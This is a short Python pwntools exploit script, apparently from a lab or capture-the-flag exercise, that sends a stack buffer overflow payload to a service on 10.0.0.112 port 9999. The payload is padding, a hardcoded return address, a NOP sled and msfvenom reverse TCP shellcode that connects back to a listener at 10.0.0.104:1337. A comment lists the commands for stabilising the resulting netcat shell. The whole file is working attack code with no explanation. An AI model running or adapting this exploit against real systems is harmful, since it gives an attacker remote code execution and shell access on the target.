#!/usr/bin/env python3

from pwn import *


#(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.104 LPORT=1337 -f python

buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
buf += b"\x68\x0a\x00\x00\x68\x68\x02\x00\x05\x39\x89\xe1"
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

ret_address = p32(0xffffcca0+80)
nops = b"\x90"*20

payload = b"A"*76
payload += ret_address
payload += nops
payload += buf

conn = remote('10.0.0.112', 9999)
conn.sendline(payload)
